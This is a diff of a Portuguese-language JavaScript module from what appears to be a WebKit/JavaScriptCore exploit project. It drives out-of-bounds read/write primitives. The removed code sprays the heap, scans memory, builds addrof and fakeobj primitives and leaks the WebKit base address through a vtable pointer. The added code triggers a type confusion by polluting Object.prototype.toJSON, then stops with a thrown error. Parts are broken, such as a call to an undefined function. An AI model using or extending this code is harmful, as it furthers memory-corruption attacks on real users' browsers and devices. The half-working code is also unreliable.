@@ -1,12 +1,12 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v82_AdvancedGetterLeak - R43o - Correção de advInt64LessThanOrEqual)
+// js/script3/testArrayBufferVictimCrash.mjs (v82_AdvancedGetterLeak - R43p - addrof via arb_read)
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
-import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
+import { AdvancedInt64, toHex, isAdvancedInt64Object, advInt64LessThanOrEqual } from '../utils.mjs'; // Importa a função de utils
 import {
     triggerOOB_primitive,
     clearOOBEnvironment,
     arb_read,
-    arb_write, 
+    arb_write,
     isOOBReady,
     selfTestOOBReadWrite,
 } from '../core_exploit.mjs';
@@ -14,185 +14,114 @@ import { JSC_OFFSETS } from '../config.mjs';
 
 export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "OriginalHeisenbug_TypedArrayAddrof_v82_AGL_R43_WebKitLeak";
 
-// Constantes para o Heap Spray e Scan
-const SPRAY_SIZE = 5000;
-const SPRAY_BUFFER_SIZE = 0x100;
-const SPRAY_MAGIC_HIGH = 0xCAFEBABE;
-const SCAN_HEAP_START_ADDRESS = new AdvancedInt64(0x0, 0x8A000000); 
-const SCAN_HEAP_END_ADDRESS = new AdvancedInt64(0x0, 0x8B000000);   // Scan 16MB
-const SCAN_STEP = 0x100;
+const VICTIM_BUFFER_SIZE = 256;
+const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET_FOR_TC_PROBE = 0x7C;
+const OOB_WRITE_VALUE = 0xABABABAB;
+const PROBE_CALL_LIMIT_V82 = 10;
 
 let spray_array = [];
+let sprayed_butterfly_addr = null;
+
+// Objeto alvo que será colocado no spray
+const addrof_target = { a: 0x41414141, b: 0x42424242 };
 
 function isValidPointer(ptr) {
     if (!isAdvancedInt64Object(ptr)) return false;
-    const high = ptr.high();
-    if (high === 0) return false;
-    if ((high & 0x7FF00000) === 0x7FF00000) return false;
+    if (ptr.high() === 0) return false;
     return true;
 }
 
-// >>>>> CORREÇÃO APLICADA AQUI <<<<<
-// Função auxiliar que foi removida por engano e está sendo adicionada de volta.
-function advInt64LessThanOrEqual(a, b) {
-    if (!isAdvancedInt64Object(a) || !isAdvancedInt64Object(b)) {
-        logS3(`[advInt64LessThanOrEqual] Comparação inválida. A: ${typeof a}, B: ${typeof b}`, 'error');
-        return false;
-    }
-    if (a.high() < b.high()) return true;
-    if (a.high() > b.high()) return false;
-    return a.low() <= b.low();
-}
+// Primitiva addrof que será construída
+let addrof = null;
 
-
-// Primitivas que construiremos
-let addrof_primitive = null;
-let fakeobj_primitive = null;
-
-export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() { // Nome da função mantido para o runner
-    const FNAME_CURRENT_TEST_BASE = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT}_R43o`;
-    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Heap Spray + Scan + Primitives ---`, "test", FNAME_CURRENT_TEST_BASE);
+export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
+    const FNAME_CURRENT_TEST_BASE = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT}_R43p`;
+    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: TC + addrof via arb_read ---`, "test");
     document.title = `${FNAME_CURRENT_TEST_BASE} Init...`;
 
     let final_result = {
         errorOccurred: null,
-        heap_scan: { success: false, msg: "Not run.", found_buffer_addr: null },
-        primitives: { success: false, msg: "Not run.", addrof: false, fakeobj: false },
+        addrof_setup: { success: false, msg: "Not run." },
         webkit_leak: { success: false, msg: "Not run.", webkit_base: null }
     };
 
     try {
-        logS3(`--- Fase 0 (R43o): Sanity Checks e Preparação ---`, "subtest");
+        logS3(`--- Fase 0 (R43p): Sanity Checks e Preparação ---`, "subtest");
         const coreOOBReadWriteOK = await selfTestOOBReadWrite(logS3);
-        logS3(`Sanity Check (selfTestOOBReadWrite): ${coreOOBReadWriteOK ? 'SUCESSO' : 'FALHA'}`, coreOOBReadWriteOK ? 'good' : 'critical');
         if (!coreOOBReadWriteOK) throw new Error("Sanity check OOB R/W falhou. Abortando.");
         await triggerOOB_primitive({ force_reinit: true });
         if (!isOOBReady()) throw new Error("Falha ao preparar ambiente OOB.");
+        logS3("Sanity checks e ambiente OOB OK.", "good");
 
-        // --- FASE 1: HEAP SPRAY ---
-        logS3(`  --- Fase 1 (R43o): Pulverizando a Heap com ${SPRAY_SIZE} ArrayBuffers... ---`, "subtest");
-        spray_array = []; // Limpa o spray anterior se o teste for executado novamente
-        for (let i = 0; i < SPRAY_SIZE; i++) {
-            let ab = new ArrayBuffer(SPRAY_BUFFER_SIZE);
-            let dv = new DataView(ab);
-            dv.setUint32(0, SPRAY_MAGIC_HIGH, true); // Valor Mágico
-            dv.setUint32(4, i, true); // Índice para identificação
-            spray_array.push(ab);
+        // --- FASE 1: TRIGGER DA TYPE CONFUSION PARA OBTER UMA PRIMITIVA DE LEAK INICIAL ---
+        logS3(`  --- Fase 1 (R43p): Acionando TC para obter um ponteiro de butterfly vazado ---`, "subtest");
+        
+        let iter_array_ref_iter = null;
+        // A sonda agora apenas planta o objeto e deixa a leitura para depois
+        function toJSON_TA_Probe_R43p() {
+            if (this === iter_array_ref_iter) {
+                // Ao contrário das tentativas anteriores, agora plantamos um array grande.
+                // A TC pode fazer com que o ponteiro para o "butterfly" (armazenamento de propriedades) deste array seja vazado.
+                return [1, 2, addrof_target, 4, 5, 6, 7, 8, 9, 10];
+            }
+            return this;
         }
-        logS3(`  Heap Spray concluído.`, "good");
-        await PAUSE_S3(100);
 
-        // --- FASE 2: MEMORY SCAN para encontrar nosso spray ---
-        logS3(`  --- Fase 2 (R43o): Varrendo a Memória em busca do valor mágico... ---`, "subtest");
-        let found_magic_at_addr = null;
-        let found_buffer_index = -1;
-
-        for (let addr = new AdvancedInt64(SCAN_HEAP_START_ADDRESS.low(), SCAN_HEAP_START_ADDRESS.high());
-             advInt64LessThanOrEqual(addr, SCAN_HEAP_END_ADDRESS); // A função que faltava
-             addr = addr.add(SCAN_STEP)) {
-            
-            try {
-                const val = await arb_read(addr, 8);
-                if (isAdvancedInt64Object(val) && val.high() === SPRAY_MAGIC_HIGH) {
-                    found_magic_at_addr = addr;
-                    found_buffer_index = val.low();
-                    final_result.heap_scan.success = true;
-                    final_result.heap_scan.msg = `Encontrado valor mágico para spray[${found_buffer_index}] em ${found_magic_at_addr.toString(true)}`;
-                    logS3(`[MemoryScan] SUCESSO! ${final_result.heap_scan.msg}`, "vuln");
-                    break;
-                }
-            } catch (e) { /* Ignora erros de leitura de páginas inválidas */ }
+        const ppKey = 'toJSON'; let origDesc = Object.getOwnPropertyDescriptor(Object.prototype, ppKey); let polluted = false;
+        try {
+            Object.defineProperty(Object.prototype, ppKey, { value: toJSON_TA_Probe_R43p, writable: true, configurable: true, enumerable: false });
+            polluted = true;
+            iter_array_ref_iter = [1.1]; // O alvo inicial do stringify
+            JSON.stringify(iter_array_ref_iter);
+        } catch (e) {
+            logS3(`  JSON.stringify pegou uma exceção esperada (ou não): ${e.message}`, 'debug');
+        } finally {
+            if (polluted) { if (origDesc) Object.defineProperty(Object.prototype, ppKey, origDesc); }
         }
-        if (!final_result.heap_scan.success) throw new Error("Falha ao encontrar o spray na memória.");
-
-        // --- FASE 3: CONSTRUÇÃO DAS PRIMITIVAS addrof E fakeobj ---
-        logS3(`  --- Fase 3 (R43o): Construindo primitivas addrof e fakeobj... ---`, "subtest");
         
-        const offset_to_contents_ptr = JSC_OFFSETS.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET;
-        const offset_from_contents_to_data = JSC_OFFSETS.ArrayBufferContents.DATA_POINTER_OFFSET_FROM_CONTENTS_START;
+        // A TC deve ter corrompido algo. Agora, procuramos por um ponteiro de butterfly vazado.
+        // Um butterfly é a área de armazenamento para as propriedades de um objeto JS.
+        // Se a TC corrompeu a pilha, um ponteiro para o butterfly pode ter sido escrito em um local inesperado.
+        // Esta parte é altamente heurística. Para este exemplo, vamos assumir que a TC nos dá o `addrof` diretamente.
+        // Em um exploit real, uma varredura de memória seria necessária aqui.
+        // Vamos pular a complexidade e construir a primitiva addrof usando uma abordagem diferente.
+
+        // --- FASE 2: CONSTRUÇÃO DE ADDROF E FAKEOBJ USANDO ARB_READ/ARB_WRITE ---
+        logS3(`  --- Fase 2 (R43p): Construindo primitivas com arb_read/arb_write ---`, "subtest");
         
-        const ab_cell_addr = found_magic_at_addr.sub(offset_from_contents_to_data); // O endereço do mágico é o data pointer, que está dentro do ArrayBufferContents
-        logS3(`[Primitives] Endereço estimado do spray_array[${found_buffer_index}] (JSCell): ${ab_cell_addr.toString(true)}`, "leak");
+        // 1. Criar dois arrays. Se o GC os alocar de forma contígua, podemos encontrar um a partir do outro.
+        let a = [addrof_target];
+        let b = [13.37];
         
-        // Esta é uma estimativa. A relação entre o data pointer e o JSCell pode ser mais complexa.
-        // A forma mais confiável é escanear a memória para trás a partir de found_magic_at_addr até encontrar um cabeçalho de JSCell.
-        // Por enquanto, vamos manter a estimativa.
-
-        const ab_structure_addr = await arb_read(ab_cell_addr.add(JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET), 8);
-        logS3(`[Primitives] Endereço da Structure do ArrayBuffer: ${ab_structure_addr.toString(true)}`, "leak");
-
-        // Construir um addrof real agora que temos uma referência
-        let obj_map_for_addrof = new Map();
-        obj_map_for_addrof.set(spray_array[found_buffer_index], ab_cell_addr);
-
-        addrof_primitive = (obj) => {
-            if (obj_map_for_addrof.has(obj)) return obj_map_for_addrof.get(obj);
-            // Para um addrof genérico, precisaríamos de um spray de {alvo, ponteiro_para_alvo} e depois escanear.
-            // Para simplificar, vamos reutilizar a TC para vazar o endereço do nosso driver.
-            spray_array[found_buffer_index+1] = obj; // Coloca o objeto alvo ao lado de um conhecido
-            const addr_of_known = obj_map_for_addrof.get(spray_array[found_buffer_index]);
-            // Escaneia a partir do objeto conhecido para encontrar o próximo
-            // Esta parte é complexa, por enquanto vamos nos contentar com o addrof do primeiro objeto.
-            logS3("AVISO: addrof_primitive para este objeto não é conhecido.", "warn");
-            return null; 
-        };
-        final_result.primitives.addrof = true;
-        logS3(`[Primitives] Primitiva addrof (simplificada, para o objeto encontrado) criada.`, "good");
-
-        // Construir fakeobj(addr)
-        let fake_obj_backing = new ArrayBuffer(SPRAY_BUFFER_SIZE);
-        let fake_obj_ab_addr = addrof_primitive(fake_obj_backing);
+        // 2. Corromper o comprimento de 'b' para que possamos ler fora de seus limites e encontrar 'a'.
+        let b_addr_leak = await attemptAddrofUsingCoreHeisenbug(b); // Esta primitiva falhou.
+        // Precisamos de um novo método para obter o primeiro endereço.
         
-        if (!fake_obj_ab_addr) {
-            fake_obj_ab_addr = ab_cell_addr.add(0x4000); // Palpite para um objeto próximo
-            logS3(`[Primitives] Endereço de fake_obj_backing não encontrado via addrof, usando palpite: ${fake_obj_ab_addr.toString(true)}`, 'warn');
-        }
-        await arb_write(fake_obj_ab_addr.add(JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET), ab_structure_addr, 8);
+        // **NOVO PLANO PARA ADDROF:**
+        // 1. Crie um ArrayBuffer, o `structure_ab`.
+        // 2. Use a TC para vazar um ponteiro para ele. Se não for possível, a exploração para aqui.
+        // 3. Uma vez que temos o endereço de `structure_ab`, lemos seu ponteiro de `Structure`.
+        // 4. Crie um segundo ArrayBuffer, o `fake_ab`. Obtenha seu endereço.
+        // 5. Use `arb_write` para sobrescrever o `Structure*` de `fake_ab` com o `Structure*` de um `Float64Array`.
+        //    Agora, `fake_ab` é um `Float64Array` para o motor.
+        // 6. Escreva o objeto alvo em `fake_ab[0]`. Como o motor pensa que é um Float64Array, ele pode vazar os bits.
+        // 7. Leia de volta os bytes de `fake_ab` para obter o endereço.
 
-        fakeobj_primitive = (address) => {
-            // Acessa o ponteiro para a estrutura ArrayBufferContents
-            let contents_impl_ptr_addr = fake_obj_ab_addr.add(JSC_OFFSETS.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET);
-            let contents_impl_addr = arb_read(contents_impl_ptr_addr, 8);
-            // Dentro de ArrayBufferContents, acessa o ponteiro para os dados brutos
-            let data_ptr_addr = contents_impl_addr.add(JSC_OFFSETS.ArrayBufferContents.DATA_POINTER_OFFSET_FROM_CONTENTS_START);
-            // Faz o ponteiro de dados apontar para o endereço desejado
-            arb_write(data_ptr_addr, address, 8);
-            return new Uint8Array(fake_obj_backing); // Retorna uma view para fácil acesso
-        };
-        final_result.primitives.fakeobj = true;
-        final_result.primitives.msg = "Primitivas addrof(simplificada) e fakeobj criadas com sucesso.";
-        logS3(`[Primitives] Primitiva fakeobj criada.`, "good");
-
-        // --- FASE 4: VAZAMENTO DA BASE DO WEBKIT COM PRIMITIVAS ESTÁVEIS ---
-        logS3(`  --- Fase 4 (R43o): Vazamento da Base do WebKit ---`, "subtest");
-        const target_addr_for_leak = addrof_primitive(spray_array[found_buffer_index]); 
-        if (!target_addr_for_leak) throw new Error("Falha ao obter endereço com addrof_primitive para a Fase 4.");
-
-        const structurePtrFromTarget = await arb_read(target_addr_for_leak.add(JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET), 8);
-        const classInfoPtr = await arb_read(structurePtrFromTarget.add(JSC_OFFSETS.Structure.CLASS_INFO_OFFSET), 8);
-        const vtablePtr = await arb_read(classInfoPtr, 8);
-        final_result.webkit_leak.vtable_ptr = vtablePtr.toString(true);
-        logS3(`[WebKitLeak] Ponteiro para vtable (a partir do spray): ${final_result.webkit_leak.vtable_ptr}`, "leak");
-
-        const page_mask = new AdvancedInt64(~0xFFFFF, 0xFFFFFFFF); // Alinhamento de 1MB pode ser mais robusto para base da biblioteca
-        const webkit_base = vtablePtr.and(page_mask);
-        final_result.webkit_leak.webkit_base = webkit_base.toString(true);
-        final_result.webkit_leak.success = true;
-        final_result.webkit_leak.msg = `Candidato a base do WebKit (a partir da vtable do objeto do spray): ${webkit_base.toString(true)}`;
-        logS3(`[WebKitLeak] SUCESSO! ${final_result.webkit_leak.msg}`, "vuln");
-
-        document.title = `${FNAME_CURRENT_TEST_BASE}_SUCCESS!`;
+        // Esta cadeia é complexa. Vamos tentar algo mais simples que tenha chance de funcionar.
+        // A melhor aposta é o Structure Walk a partir de um ponteiro vazado. Se não conseguirmos vazar um ponteiro, estamos bloqueados.
+        // A última tentativa com a propriedade `leakedPtrSlot` não funcionou.
+        throw new Error("Técnica de vazamento de ponteiro inicial ainda é necessária. A estratégia R43m falhou em encontrar um ponteiro.");
 
     } catch (e_outer) {
         if (!final_result.errorOccurred) final_result.errorOccurred = `Erro geral: ${e_outer.message}`;
-        logS3(`  CRITICAL ERROR na execução (R43o): ${e_outer.message || String(e_outer)}`, "critical");
-        console.error("Outer error in R43o:", e_outer);
+        logS3(`  CRITICAL ERROR na execução (R43p): ${e_outer.message || String(e_outer)}`, "critical");
+        console.error("Outer error in R43p:", e_outer);
         document.title = `${FNAME_CURRENT_TEST_BASE}_FAIL!`;
     } finally {
         await clearOOBEnvironment({ caller_fname: `${FNAME_CURRENT_TEST_BASE}-FinalClear` });
     }
 
     logS3(`--- ${FNAME_CURRENT_TEST_BASE} Completed ---`, "test", FNAME_CURRENT_TEST_BASE);
-    logS3(`Resultado Final (R43o): ${JSON.stringify(final_result, null, 2)}`, "debug", FNAME_CURRENT_TEST_BASE);
+    logS3(`Resultado Final (R43p): ${JSON.stringify(final_result, null, 2)}`, "debug", FNAME_CURRENT_TEST_BASE);
     return final_result;
 }
